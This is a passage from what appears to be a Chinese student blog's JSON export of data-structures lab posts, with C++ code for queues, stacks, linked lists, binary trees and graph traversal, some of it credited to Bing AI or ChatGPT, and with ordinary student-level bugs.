&lt;&lt; &quot;队空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tfront = (front + 1) % QueueSize;\t\treturn data[front];\t&#125;&#125;template&lt;typename DataType&gt;DataType CirQueue&lt;DataType&gt;::GetQueue()&#123;\tif (front == rear)\t&#123;\t\tcout &lt;&lt; &quot;队空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\treturn data[(front + 1) % QueueSize];\t&#125;\t&#125;template&lt;typename DataType&gt;int CirQueue&lt;DataType&gt;::Empty()&#123;\tif (front == rear)\t&#123;\t\treturn 1;\t&#125;\telse\t&#123;\t\treturn 0;\t&#125;&#125;int main()&#123;\tCirQueue&lt;int&gt; S&#123;&#125;;\tint x = 0;\tS.EnQueue(1);\tS.EnQueue(2);\tS.EnQueue(3);\tcout &lt;&lt; &quot;已入队1,2,3&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;******取一次队头******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;队头是：&quot; &lt;&lt; S.GetQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;请输入一个元素进行入队&quot; &lt;&lt; endl;\tcin &gt;&gt; x;\tS.EnQueue(x);\tcout &lt;&lt; &quot;已入队：&quot; &lt;&lt; x &lt;&lt; endl;\tcout &lt;&lt; &quot;******取一次队头******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;队头是：&quot; &lt;&lt; S.GetQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;******执行一次出队******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****进行一次判空*****&quot; &lt;&lt; endl;\tif (S.Empty() == 1)\t&#123; \t\tcout &lt;&lt; &quot;队列空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;队列非空&quot; &lt;&lt; endl;\t&#125;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****进行一次判空*****&quot; &lt;&lt; endl;\tif (S.Empty() == 1)\t&#123;\t\tcout &lt;&lt; &quot;队列空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;队列非空&quot; &lt;&lt; endl;\t&#125;\treturn 0;&#125;\n\n链式队列LinkQueue的实现：#include&lt;iostream&gt;using namespace std;template&lt;typename DataType&gt;struct node&#123;\tDataType data;\tnode&lt;DataType&gt;* next;&#125;;template&lt;typename DataType&gt;class LinkQueue&#123;public:\tLinkQueue();\t~LinkQueue();\tvoid enQueue(DataType x);\tDataType DeQueue();\tDataType GetQueue();\tint Empty();private:\tnode&lt;DataType&gt;* front, * rear;&#125;;template&lt;typename DataType&gt;LinkQueue&lt;DataType&gt;::LinkQueue()&#123;\tnode&lt;DataType&gt;* s = nullptr;\ts = new node&lt;DataType&gt;;//开辟空间\ts-&gt;next = nullptr;\tfront = rear = s;&#125;template&lt;typename DataType&gt;LinkQueue&lt;DataType&gt;::~LinkQueue()&#123;\tnode&lt;DataType&gt;* q = nullptr;\twhile (front != nullptr)\t&#123;\t\tq = front;\t\tfront = front-&gt;next;\t\tdelete q;\t&#125;&#125;template&lt;typename DataType&gt;void LinkQueue&lt;DataType&gt;::enQueue(DataType x)&#123;\tnode&lt;DataType&gt;* s = nullptr;\ts = new node&lt;DataType&gt;;\ts-&gt;data = x;\ts-&gt;next = nullptr;\trear-&gt;next = s;\t//插入到队尾\trear = s;\t\t//移动队尾&#125;template&lt;typename DataType&gt;DataType LinkQueue&lt;DataType&gt;::DeQueue()&#123;\tDataType x;\tnode&lt;DataType&gt;* p = nullptr;\tif (reat==front )\t&#123;\t\tcout &lt;&lt; &quot;队空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tp = front-&gt;next;\t\tx = p-&gt;data;\t\tfront-&gt;next = p-&gt;next;\t\tdelete p;\t\treturn x;\t&#125;&#125;template&lt;typename DataType&gt;DataType LinkQueue&lt;DataType&gt;::GetQueue()&#123;\tif (front == rear)\t&#123;\t\tcout &lt;&lt; &quot;队空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\treturn front-&gt;next-&gt;data;\t&#125;&#125;template&lt;typename DataType&gt;int LinkQueue&lt;DataType&gt;::Empty()&#123;\tif (front == rear )\t&#123;\t\treturn 1;\t&#125;\telse\t&#123;\t\treturn 0;\t&#125;&#125;int main()&#123;\tint x;\tLinkQueue&lt;int&gt; S = &#123;&#125;;\tS.enQueue(1);\tS.enQueue(2);\tS.enQueue(3);\tcout &lt;&lt; &quot;已入队1,2,3&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;******取一次队头******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;队头是：&quot; &lt;&lt; S.GetQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;请输入一个元素进行入队&quot; &lt;&lt; endl;\tcin &gt;&gt; x;\tS.enQueue(x);\tcout &lt;&lt; &quot;已入队：&quot; &lt;&lt; x &lt;&lt; endl;\tcout &lt;&lt; &quot;******取一次队头******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;队头是：&quot; &lt;&lt; S.GetQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;******执行一次出队******&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****进行一次判空*****&quot; &lt;&lt; endl;\tif (S.Empty() == 1)\t&#123;\t\tcout &lt;&lt; &quot;队列空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;队列非空&quot; &lt;&lt; endl;\t&#125;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;已出队：&quot; &lt;&lt; S.DeQueue() &lt;&lt; endl;\tcout &lt;&lt; &quot;*****进行一次判空*****&quot; &lt;&lt; endl;\tif (S.Empty() == 1)\t&#123;\t\tcout &lt;&lt; &quot;队列空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tcout &lt;&lt; &quot;队列非空&quot; &lt;&lt; endl;\t&#125;\treturn 0;&#125;\n\n十进制转换为二至九进制之间的任一进制的算法实现：\n这里有一个细节就是，任何数转化为任何进制，最后整除取整的结果都是0，而最后一次压栈是无法在循环里压栈（在这个算法里），需要在循环外再写一行压栈，把最后一个进制数压进去（也就是输出结果的第一位）\n\n/*十进制转化为其他进制，实际上是做取余然后逆序输出运算，可以用顺序栈实现功能*/#include &lt;iostream&gt;using namespace std;const int StackSize = 10000;  // 定义最大栈顶具体情况具体分析template&lt;typename DataType&gt;   //定义模板类SeqStackclass SeqStack&#123;public:\tSeqStack();   //构造函数，初始化空栈\t~SeqStack();\t//析构函数\tvoid Push(DataType x);\t//压栈\tDataType Pop();\t//出栈\tDataType GetTop();//取栈顶\tint empty();\t//判空操作private:\tDataType data[StackSize];\t//存放栈元素的数组\tint top;\t//栈顶元素的下标&#125;;template&lt;typename DataType&gt;SeqStack&lt;DataType&gt;::~SeqStack()&#123;&#125;template&lt;typename DataType&gt;void SeqStack&lt;DataType&gt;::Push(DataType x)&#123;\tif (top == StackSize - 1)\t&#123;\t\tcout &lt;&lt; &quot;栈满&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\ttop++;\t\tdata[top] = x;\t&#125;&#125;template&lt;typename DataType&gt;DataType SeqStack&lt;DataType&gt;::Pop()&#123;\tif (top == -1)\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\tDataType x;\t\tx = data[top];\t\ttop--;\t\treturn x;\t&#125;&#125;template&lt;typename DataType&gt;DataType SeqStack&lt;DataType&gt;::GetTop()&#123;\tif (top == -1)\t&#123;\t\tcout &lt;&lt; &quot;栈空&quot; &lt;&lt; endl;\t&#125;\telse\t&#123;\t\treturn data[top];\t&#125;&#125;template&lt;typename DataType&gt;int SeqStack&lt;DataType&gt;::empty()&#123;\tif (top == -1)\t&#123;\t\treturn 1;\t&#125;\telse\t&#123;\t\treturn 0;\t&#125;&#125;template&lt;typename DataType&gt;SeqStack&lt;DataType&gt;::SeqStack()&#123;\ttop = -1;&#125;int main()&#123;\tSeqStack&lt;int&gt; s = &#123;&#125;;\tint x, y, count = 1;\tcout &lt;&lt; &quot;请按顺序输入你想转化的十进制数，和目标进制（2-9），以空格隔开&quot; &lt;&lt; endl;\tcin &gt;&gt; x &gt;&gt; y;\twhile ((x/y) != 0)\t&#123;\t\tcout &lt;&lt;&quot;入栈&quot; &lt;&lt; x % y &lt;&lt; endl;\t\ts.Push(x % y);\t\tcount++;\t\tx /= y;\t&#125;\ts.Push(x % y);\tcout &lt;&lt; &quot;入栈&quot; &lt;&lt; x % y &lt;&lt; endl;\tcout &lt;&lt;&quot;************************&quot; &lt;&lt; endl;\tcout &lt;&lt; &quot;转换后的结果是&quot;;\twhile (count!=0)\t&#123;\t\tcout&lt;&lt;s.Pop();\t\tcount--;\t&#125;\tcout &lt;&lt; endl;\tcout &lt;&lt; &quot;************************&quot; &lt;&lt; endl;\treturn 0;&#125;\n\n\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验二、链式存储结构线性表的建立及操作","url":"/posts/50b4f37a.html","content":"\n声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬\n\n\n代码主体以下是一个简单的C++实现，用于维护单链表：\n\n来自bing ai\n\n#include &lt;iostream&gt;using namespace std;template &lt;typename DataType&gt;struct Node&#123;    DataType data;        // 数据域    Node&lt;DataType&gt;* next; // 指针域&#125;;template &lt;typename DataType&gt;class LinkList&#123;public:    LinkList();                    // 无参构造函数，建立只有头结点的空链表    LinkList(DataType a[], int n); // 有参构造函数，建立有n个元素的单链表    ~LinkList();                   // 析构函数    int Length();                  // 求单链表的长度    int Empety();    DataType Get(int i);            // 按位查找。查找第i个结点的元素值    int Locate(DataType x);         // 按值查找。查找值为x的元素序号    void Insert(int i, DataType x); // 插入操作，第i个位置插入值为x的结点    DataType Delete(int i);         // 删除操作，删除第i个结点    void PrintList();               // 遍历操作，按序号依次输出各元素private:    Node&lt;DataType&gt;* first; // 单链表的头指针&#125;;template &lt;typename DataType&gt;LinkList&lt;DataType&gt;::LinkList()&#123;    first = new Node&lt;DataType&gt;; // 生成头结点    first-&gt;next = nullptr;      // 头结点的指针域置空&#125;template &lt;typename DataType&gt;int LinkList&lt;DataType&gt;::Empety()&#123;    if (first-&gt;next == nullptr)        return 1;    else        return 0;&#125;template &lt;typename DataType&gt;void LinkList&lt;DataType&gt;::PrintList()&#123;    Node&lt;DataType&gt;* p = first-&gt;next; // 工作指针p初始化    while (p != nullptr)    &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot;\\t&quot;;        p = p-&gt;next; // 工作指针p后移，注意不能写作p++    &#125;&#125;template &lt;typename DataType&gt;int LinkList&lt;DataType&gt;::Length()&#123;    Node&lt;DataType&gt;* p = first-&gt;next; // 工作指针p初始化为开始接点    int count = 0;                   // 累加器count初始化    while (p != nullptr)    &#123;        p = p-&gt;next;        count++;    &#125;    return count; // 注意count的初始化和返回值之间的关系&#125;template &lt;typename DataType&gt;DataType LinkList&lt;DataType&gt;::Get(int i)&#123;    Node&lt;DataType&gt;* p = first-&gt;next; // 工作指针p初始化    int count = 1;                   // 累加器count初始化    while (p != nullptr &amp;&amp; count &lt; i)    &#123;        p = p-&gt;next; // 工作指针p后移        count++;    &#125;    if (p == nullptr)        throw &quot;位置&quot;;    else        return p-&gt;data;&#125;template &lt;typename DataType&gt;int LinkList&lt;DataType&gt;::Locate(DataType x)&#123;    Node&lt;DataType&gt;* p = first-&gt;next; // 工作指针p初始化    int count = 1;                   // 累加器count初始化    while (p != nullptr)    &#123;        if (p-&gt;data == x)            return count; // 查找成功，结束函数并返回序号        p = p-&gt;next;        count++;    &#125;    return 0; // 退出循环表明查找失败&#125;template &lt;typename DataType&gt;void LinkList&lt;DataType&gt;::Insert(int i, DataType x)&#123;    Node&lt;DataType&gt;* p = first, * s = nullptr; // 工作指针p初始化    int count = 0;    while (p != nullptr &amp;&amp; count &lt; i - 1) // 查找第i – 1个结点    &#123;        p = p-&gt;next; // 工作指针p后移        count++;    &#125;    if (p == nullptr)        throw &quot;位置&quot;; // 没有找到第i – 1个结点    else    &#123;        s = new Node&lt;DataType&gt;;        s-&gt;data = x; // 申请结点s，数据域为x        s-&gt;next = p-&gt;next;        p-&gt;next = s; // 将结点s插入到结点p之后    &#125;&#125;template &lt;typename DataType&gt;LinkList&lt;DataType&gt;::LinkList(DataType a[], int n)&#123;    first = new Node&lt;DataType&gt;;              // 生成头结点    Node&lt;DataType&gt;* r = first, * s = nullptr; // 尾指针初始化    for (int i = 0; i &lt; n; i++)    &#123;        s = new Node&lt;DataType&gt;;        s-&gt;data = a[i];        r-&gt;next = s;        r = s; // 将结点s插入到终端结点之后    &#125;    r-&gt;next = nullptr; // 单链表建立完毕，将终端结点的指针域置空&#125;template &lt;typename DataType&gt;DataType LinkList&lt;DataType&gt;::Delete(int i)&#123;    DataType x;    Node&lt;DataType&gt;* p = first, * q = nullptr; // 工作指针p指向头结点    int count = 0;    while (p != nullptr &amp;&amp; count &lt; i - 1) // 查找第i-1个结点    &#123;        p = p-&gt;next;        count++;    &#125;    if (p == nullptr || p-&gt;next == nullptr) // 结点p不存在或p的后继结点不存在        throw &quot;位置&quot;;    else    &#123;        q = p-&gt;next;        x = q-&gt;data;       // 暂存被删结点        p-&gt;next = q-&gt;next; // 摘链        delete q;        return x;    &#125;&#125;template &lt;class DataType&gt;LinkList&lt;DataType&gt;::~LinkList()&#123;    Node&lt;DataType&gt;* q = NULL;    while (first != NULL) // 释放单链表的每一个结点的存储空间    &#123;        q = first;           // 暂存被释放结点        first = first-&gt;next; // first指向被释放结点的下一个结点        delete q;    &#125;&#125;int main()&#123;    int maxsize;    cout &lt;&lt; &quot;请输入你要创建数组的大小&quot; &lt;&lt; endl;    cin &gt;&gt; maxsize;    int* a = new int[maxsize];    for (int i = 0; i &lt; maxsize; i++)    &#123;        a[i] = i+1;        cout &lt;&lt; &quot; &quot; &lt;&lt; endl;    &#125;    cout &lt;&lt; &quot;已创建一个最大长度&quot;&lt;&lt;maxsize&lt;&lt;&quot;的随机数链表&quot; &lt;&lt; endl;    LinkList&lt;int&gt; L&#123; a, maxsize &#125;;    cout &lt;&lt; &quot;执行遍历链表&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;请输入一个最大长度内的数字查找元素&quot; &lt;&lt; endl;    int i;    cin &gt;&gt; i;    cout &lt;&lt; L.Locate(i) &lt;&lt; endl;    cout &lt;&lt; &quot;请插入一个新数字元素，请依次输入位置和数据&quot; &lt;&lt; endl;    int j, k;    cin &gt;&gt; j &gt;&gt; k;    L.Insert(j, k);    cout &lt;&lt; &quot;执行遍历链表&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    cout &lt;&lt; &quot;请删除一个新数字元素，请输入位置&quot; &lt;&lt; endl;    int l;    cin &gt;&gt; l;    cout &lt;&lt; &quot;删除的元素位置是&quot; &lt;&lt; l &lt;&lt; &quot;数据是&quot; &lt;&lt; L.Get(l) &lt;&lt; endl;    L.Delete(l);    cout &lt;&lt; &quot;执行遍历链表&quot; &lt;&lt; endl;    L.PrintList();    cout &lt;&lt; endl;    return 0;&#125;\n\n这个程序首先创建了一个空的单链表，然后向其中添加了一些节点。然后，它遍历了整个列表，查找了一个元素，插入了一个新的元素，删除了一个元素，然后再次遍历了整个列表。希望这个示例能对你有所帮助！\n两个有序单链表合并为一个有序单链表当然，这是一个包含main函数的完整程序，它创建了两个有序链表，并将它们合并为一个有序链表：\n#include &lt;iostream&gt;// 定义链表节点struct ListNode &#123;    int val;    ListNode *next;    ListNode(int x) : val(x), next(NULL) &#123;&#125;&#125;;// 合并两个有序链表ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) &#123;    if (l1 == NULL) &#123;        return l2;    &#125;    if (l2 == NULL) &#123;        return l1;    &#125;    if (l1-&gt;val &lt; l2-&gt;val) &#123;        l1-&gt;next = mergeTwoLists(l1-&gt;next, l2);        return l1;    &#125; else &#123;        l2-&gt;next = mergeTwoLists(l1, l2-&gt;next);        return l2;    &#125;&#125;int main() &#123;    // 创建第一个有序链表：1 -&gt; 3 -&gt; 5    ListNode *l1 = new ListNode(1);    l1-&gt;next = new ListNode(3);    l1-&gt;next-&gt;next = new ListNode(5);    // 创建第二个有序链表：2 -&gt; 4 -&gt; 6    ListNode *l2 = new ListNode(2);    l2-&gt;next = new ListNode(4);    l2-&gt;next-&gt;next = new ListNode(6);    // 合并两个有序链表    ListNode *merged = mergeTwoLists(l1, l2);    // 打印合并后的链表    while (merged != NULL) &#123;        std::cout &lt;&lt; merged-&gt;val &lt;&lt; &quot; &quot;;        merged = merged-&gt;next;    &#125;    return 0;&#125;\n\n这个程序首先创建了两个有序链表l1和l2，然后调用mergeTwoLists函数将它们合并为一个新的有序链表。最后，它遍历新的链表并打印出每个节点的值。\n请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，这个程序假设输入的链表已经排序。如果输入的链表没有排序，你需要先对它们进行排序。\t\n双链表双链表是一种更复杂的线性数据结构，它的每个节点都有两个链接，一个指向前一个节点，另一个指向后一个节点。以下是一个使用C++实现的双链表的基本设计：\n#include &lt;iostream&gt;// 定义双链表节点struct ListNode &#123;    int val;    ListNode *prev;    ListNode *next;    ListNode(int x) : val(x), prev(NULL), next(NULL) &#123;&#125;&#125;;// 添加节点到双链表的末尾void addNode(ListNode* &amp;head, int val) &#123;    ListNode* newNode = new ListNode(val);    if (head == NULL) &#123;        head = newNode;    &#125; else &#123;        ListNode* temp = head;        while (temp-&gt;next != NULL) &#123;            temp = temp-&gt;next;        &#125;        temp-&gt;next = newNode;        newNode-&gt;prev = temp;    &#125;&#125;// 打印双链表void printList(ListNode* head) &#123;    ListNode* temp = head;    while (temp != NULL) &#123;        std::cout &lt;&lt; temp-&gt;val &lt;&lt; &quot; &quot;;        temp = temp-&gt;next;    &#125;    std::cout &lt;&lt; std::endl;&#125;int main() &#123;    // 创建一个空的双链表    ListNode* head = NULL;    // 添加节点到双链表    addNode(head, 1);    addNode(head, 2);    addNode(head, 3);    // 打印双链表    printList(head);    return 0;&#125;\n\n这个程序首先定义了一个双链表节点的结构，然后定义了两个函数：addNode用于向双链表的末尾添加新的节点，printList用于打印双链表的所有节点。在main函数中，它创建了一个空的双链表，然后添加了几个节点，并打印出了这个双链表。\n请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，你可能还需要实现其他操作，如删除节点、查找节点等。这取决于你的具体需求。如果你需要帮助实现这些操作，请随时向我询问！\n循环链表循环链表是一种特殊的链表，其中最后一个元素指向链表的第一个元素。这种类型的数据结构可以用于实现需要循环或重复的算法。以下是一个使用C++实现的循环链表的基本设计：\n#include &lt;iostream&gt;// 定义链表节点struct ListNode &#123;    int val;    ListNode *next;    ListNode(int x) : val(x), next(NULL) &#123;&#125;&#125;;// 添加节点到循环链表的末尾void addNode(ListNode* &amp;head, int val) &#123;    ListNode* newNode = new ListNode(val);    if (head == NULL) &#123;        head = newNode;        newNode-&gt;next = head;    &#125; else &#123;        ListNode* temp = head;        while (temp-&gt;next != head) &#123;            temp = temp-&gt;next;        &#125;        temp-&gt;next = newNode;        newNode-&gt;next = head;    &#125;&#125;// 打印循环链表void printList(ListNode* head) &#123;    if (head == NULL) return;    ListNode* temp = head;    do &#123;        std::cout &lt;&lt; temp-&gt;val &lt;&lt; &quot; &quot;;        temp = temp-&gt;next;    &#125; while (temp != head);    std::cout &lt;&lt; std::endl;&#125;int main() &#123;    // 创建一个空的循环链表    ListNode* head = NULL;    // 添加节点到循环链表    addNode(head, 1);    addNode(head, 2);    addNode(head, 3);    // 打印循环链表    printList(head);    return 0;&#125;\n\n这个程序首先定义了一个链表节点的结构，然后定义了两个函数：addNode用于向循环链表的末尾添加新的节点，printList用于打印循环链表的所有节点。在main函数中，它创建了一个空的循环链表，然后添加了几个节点，并打印出了这个循环链表。\n请注意，这个程序没有释放分配给链表节点的内存。在实际使用中，你应该在不再需要节点时释放它们的内存，以防止内存泄漏。此外，你可能还需要实现其他操作，如删除节点、查找节点等。这取决于你的具体需求。如果你需要帮助实现这些操作，请随时向我询问！\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验五 树和二叉树的实现与应用","url":"/posts/6a30266c.html","content":"\n吐槽一下唉数据结构，唉二叉树，唉C++类，好多都不会，不懂得class类的用法，不知道怎么写代码\n先是复制课本上的代码，然后经过缝缝补补，发现课本上的代码竟然有字母打错的可能（痛骂编者\n然后用ChatGPT不断缝缝补补（点赞ChatGPT，用来写代码真的很不错\n这下知新作业终于是写完了，逆向已经一个也没动了\n代码#include &lt;iostream&gt;using namespace std;template&lt;typename DataType&gt;struct BiNode&#123;\tDataType data;\tBiNode&lt;DataType&gt;* lchild, * rchild;&#125;;template&lt;typename DataType&gt;class BiTree&#123;public:\tBiTree() &#123; root = Creat(); &#125;   //建立一棵二叉树\t~BiTree() &#123; Release(root); &#125;    //释放各节点的存储空间\tvoid PreOrder() &#123; PreOrder(root); &#125;//前序\tvoid InOrder() &#123; InOrder(root); &#125;//中序\tvoid PostOrder() &#123; PostOrder(root); &#125;//后序\tvoid LevelOrder();                  //层序\tint NodeTree(BiNode&lt;DataType&gt;* bt) &#123; return NodeTreeHelper(bt); &#125; //计算叶子节点数\tint TreeDepth() &#123; return TreeDepthHelper(root); &#125; //计算二叉树深度\tBiNode&lt;DataType&gt;* root;//指向根节点的头指针private:\tBiNode&lt;DataType&gt;* Creat();              //构造函数调用\tvoid Release(BiNode&lt;DataType&gt;* bt);     //析构函数调用\tvoid PreOrder(BiNode&lt;DataType&gt;* bt);    //前序\tvoid InOrder(BiNode&lt;DataType&gt;* bt);     //中序\tvoid PostOrder(BiNode&lt;DataType&gt;* bt);   //后序\tint NodeTreeHelper(BiNode&lt;DataType&gt;* bt); //辅助函数用于计算叶子节点数量\tint TreeDepthHelper(BiNode&lt;DataType&gt;* bt); //辅助函数用于计算二叉树深度&#125;;// 二叉链表类BiTree的前序遍历template &lt;typename DataType&gt;void BiTree&lt;DataType&gt; ::PreOrder(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr) return;\telse &#123;\t\tcout &lt;&lt; bt-&gt;data;\t\tPreOrder(bt-&gt;lchild);\t\tPreOrder(bt-&gt;rchild);\t&#125;&#125;// 二叉链表类BiTree的中序遍历template &lt;typename DataType&gt;void BiTree&lt;DataType&gt; ::InOrder(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr) return;\telse &#123;\t\tInOrder(bt-&gt;lchild);\t\tcout &lt;&lt; bt-&gt;data;\t\tInOrder(bt-&gt;rchild);\t&#125;&#125;// 二叉链表类BiTree的后序遍历template &lt;typename DataType&gt;void BiTree&lt;DataType&gt; ::PostOrder(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr) return;\telse &#123;\t\tPostOrder(bt-&gt;lchild);\t\tPostOrder(bt-&gt;rchild);\t\tcout &lt;&lt; bt-&gt;data;\t&#125;&#125;// 二叉链表类BiTree的层序遍历template &lt;typename DataType&gt;void BiTree&lt;DataType&gt; ::LevelOrder()&#123;\tBiNode&lt;DataType&gt;* Q[100], * q = nullptr;\tint front = -1, rear = -1;\tif (root == nullptr) return;\tQ[++rear] = root;\twhile (front != rear)\t&#123;\t\tq = Q[++front];\t\tcout &lt;&lt; q-&gt;data;\t\tif (q-&gt;lchild != nullptr)  Q[++rear] = q-&gt;lchild;\t\tif (q-&gt;rchild != nullptr)  Q[++rear] = q-&gt;rchild;\t&#125;&#125;template &lt;typename DataType&gt;BiNode&lt;DataType&gt;* BiTree&lt;DataType&gt;::Creat()&#123;\tBiNode&lt;DataType&gt;* bt;\tchar ch;\tcin &gt;&gt; ch;\tif (ch == &#x27;#&#x27;)\t&#123;\t\tbt = nullptr;\t&#125;\telse\t&#123;\t\tbt = new BiNode&lt;DataType&gt;;\t\tbt-&gt;data = ch;\t\tbt-&gt;lchild = Creat();\t\tbt-&gt;rchild = Creat();\t&#125;\treturn bt;&#125;template&lt;typename DataType&gt;void BiTree&lt;DataType&gt;::Release(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr)\t&#123;\t\treturn;\t&#125;\telse\t&#123;\t\tRelease(bt-&gt;lchild);\t\tRelease(bt-&gt;rchild);\t\tdelete bt;\t&#125;&#125;template &lt;typename DataType&gt;int BiTree&lt;DataType&gt;::NodeTreeHelper(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr) &#123;\t\treturn 0;\t&#125;\tif (bt-&gt;lchild == nullptr &amp;&amp; bt-&gt;rchild == nullptr) &#123;\t\treturn 1;\t&#125;\treturn NodeTreeHelper(bt-&gt;lchild) + NodeTreeHelper(bt-&gt;rchild);&#125;template &lt;typename DataType&gt;int BiTree&lt;DataType&gt;::TreeDepthHelper(BiNode&lt;DataType&gt;* bt)&#123;\tif (bt == nullptr) &#123;\t\treturn 0;\t&#125;\tint leftDepth = TreeDepthHelper(bt-&gt;lchild);\tint rightDepth = TreeDepthHelper(bt-&gt;rchild);\treturn (leftDepth &gt; rightDepth) ? (leftDepth + 1) : (rightDepth + 1);&#125;int main()&#123;\tBiTree&lt;char&gt; t&#123;&#125;;\tcout &lt;&lt; &quot;前序遍历&quot;;\tt.PreOrder();\tcout &lt;&lt; &quot;\\n中序遍历&quot;;\tt.InOrder();\tcout &lt;&lt; &quot;\\n后序遍历&quot;;\tt.PostOrder();\tcout &lt;&lt; &quot;\\n层序遍历&quot;;\tt.LevelOrder();\tcout &lt;&lt; &quot;\\n叶子结点数:&quot; &lt;&lt; t.NodeTree(t.root);\tcout &lt;&lt; &quot;\\n二叉树深度:&quot; &lt;&lt; t.TreeDepth();\treturn 0;&#125;\n\n","categories":["学习笔记","数据结构作业","实验"],"tags":["数据结构作业"]},{"title":"实验六 图的构建与遍历","url":"/posts/7c2ee8e.html","content":"\n邻接矩阵#include &lt;iostream&gt;using namespace std;const int MaxSize = 10;int visited[MaxSize] = &#123; 0 &#125;;template &lt;class DataType&gt;class MGraph &#123;public:    MGraph(DataType a[], int n, int e);    ~MGraph() &#123;&#125;;    void DFTraverse(int v);    void BFTraverse(int v);private:    DataType vertex[MaxSize];    int edge[MaxSize][MaxSize];    int vertexNum, edgeNum;&#125;;template &lt;class DataType&gt;MGraph&lt;DataType&gt;::MGraph(DataType a[], int n, int e) &#123;    int i, j, k;    vertexNum = n; edgeNum = e;    for (i = 0; i &lt; vertexNum; i++)        vertex[i] = a[i];    for (i = 0; i &lt; vertexNum; i++)        for (j = 0; j &lt; vertexNum; j++)            edge[i][j] = 0;    for (k = 0; k &lt; edgeNum; k++) &#123;        cout &lt;&lt; &quot;请输入边依附的两个顶点的编号：&quot;;        cin &gt;&gt; i &gt;&gt; j;        edge[i][j] = 1; edge[j][i] = 1;    &#125;&#125;template &lt;class DataType&gt;void MGraph&lt;DataType&gt;::DFTraverse(int v) &#123;    cout &lt;&lt; vertex[v]; visited[v] = 1;    for (int j = 0; j &lt; vertexNum; j++)        if (edge[v][j] == 1 &amp;&amp; visited[j] == 0) DFTraverse(j);&#125;template &lt;class DataType&gt;void MGraph&lt;DataType&gt;::BFTraverse(int v) &#123;    int w, j, Q[MaxSize];    int front = -1, rear = -1;    cout &lt;&lt; vertex[v]; visited[v] = 1; Q[++rear] = v;    while (front != rear) &#123;        w = Q[++front];        for (j = 0; j &lt; vertexNum; j++)            if (edge[w][j] == 1 &amp;&amp; visited[j] == 0) &#123;                cout &lt;&lt; vertex[j]; visited[j] = 1; Q[++rear] = j;            &#125;    &#125;&#125;int main() &#123;    int i;    string ch[] = &#123; &quot;V1&quot;,&quot;V2&quot;,&quot;V3&quot;,&quot;V4&quot;,&quot;V5&quot; &#125;;    MGraph&lt;string&gt; MG&#123; ch, 5, 6 &#125;;    for (i = 0; i &lt; MaxSize; i++)        visited[i] = 0;    cout &lt;&lt; &quot;\\n深度优先遍历序列是：&quot; &lt;&lt; endl;    MG.DFTraverse(0);    for (i = 0; i &lt; MaxSize; i++)        visited[i] = 0;    cout &lt;&lt; &quot;\\n广度优先遍历序列是：&quot; &lt;&lt; endl;    MG.BFTraverse(0);    return 0;&#125;\n\n邻接表#include &lt;iostream&gt;using namespace std;struct EdgeNode\t\t//定义边表结点&#123;\tint adjvex;\t//邻接点域\tEdgeNode* next;&#125;;template&lt;class DataType&gt;struct VertexNode\t\t//定义顶点表结点&#123;\tDataType vertex;\tEdgeNode* firstEdge;&#125;;const int MaxSize = 10;\t\t//图的最多顶点数int visited[MaxSize] = &#123; 0 &#125;;template &lt;class DataType&gt;class ALGraph&#123;public:\tALGraph(DataType a[], int n, int e);\t\t\t//构造函数\t~ALGraph();\t\t\t\t\t\t\t\t\t//析构函数\tvoid DFTraverse(int v);\t\t\t\t\t//深度\tvoid BEFraverse(int v);\t\t\t\t\t//广度private:\tVertexNode&lt;DataType&gt; 